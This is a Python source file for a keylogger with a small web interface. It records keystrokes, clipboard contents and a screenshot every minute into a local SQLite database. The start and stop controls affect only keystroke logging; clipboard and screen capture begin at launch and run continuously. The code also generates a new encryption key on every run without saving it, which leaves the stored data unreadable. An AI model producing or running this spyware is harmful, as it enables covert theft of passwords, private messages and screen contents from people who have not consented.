import eel
from pynput import keyboard
import sqlite3
from datetime import datetime
import threading
import pyperclip
import pyautogui
import base64
import time
from cryptography.fernet import Fernet

# Initialize Eel
eel.init("web")

# Keylogger state
is_logging = False
key_listener = None

# Encryption key (for demo; store securely in production)
fernet_key = Fernet.generate_key()
cipher = Fernet(fernet_key)

# Database setup
def setup_database():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_pressed TEXT,
        timestamp DATETIME
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS clipboard (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        content TEXT,
        timestamp DATETIME
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS screenshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        image BLOB,
        timestamp DATETIME
    )''')
    conn.commit()
    conn.close()

setup_database()

# Clipboard logger
def log_clipboard():
    previous_clipboard = ""
    while True:
        try:
            current = pyperclip.paste()
            if current != previous_clipboard:
                encrypted = cipher.encrypt(current.encode())
                conn = sqlite3.connect('keystrokes.db')
                cursor = conn.cursor()
                cursor.execute("INSERT INTO clipboard (content, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
                conn.commit()
                conn.close()
                previous_clipboard = current
        except Exception as e:
            print(f"Clipboard error: {e}")
        time.sleep(10)

# Screenshot logger
def periodic_screenshot():
    while True:
        try:
            screenshot = pyautogui.screenshot()
            buffer = screenshot.tobytes()
            encoded_image = base64.b64encode(buffer)
            conn = sqlite3.connect('keystrokes.db')
            cursor = conn.cursor()
            cursor.execute("INSERT INTO screenshots (image, timestamp) VALUES (?, ?)", (encoded_image, datetime.now()))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Screenshot error: {e}")
        time.sleep(60)

# Keyboard logger
def on_press(key):
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)
        try:
            encrypted = cipher.encrypt(keystroke.encode())
            conn = sqlite3.connect('keystrokes.db')
            cursor = conn.cursor()
            cursor.execute("INSERT INTO keystrokes (key_pressed, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Key logging error: {e}")

# Start logging
@eel.expose
def start_logging():
    global is_logging, key_listener
    if not is_logging:
        is_logging = True
        key_listener = keyboard.Listener(on_press=on_press)
        key_listener.start()
        return "Keylogger started"
    return "Keylogger already running"

# Stop logging
@eel.expose
def stop_logging():
    global is_logging, key_listener
    is_logging = False
    if key_listener:
        key_listener.stop()
        key_listener = None
        return "Keylogger stopped"
    return "Keylogger was not running"

# Start background threads
threading.Thread(target=log_clipboard, daemon=True).start()
threading.Thread(target=periodic_screenshot, daemon=True).start()

# Launch UI
try:
    eel.start("index.html", mode='chrome', port=8080, block=False)
except EnvironmentError:
    print("Open manually at http://localhost:8080")
    eel.start("index.html", mode=None, port=8080, block=False)

# Keep the app running
while True:
    time.sleep(1)
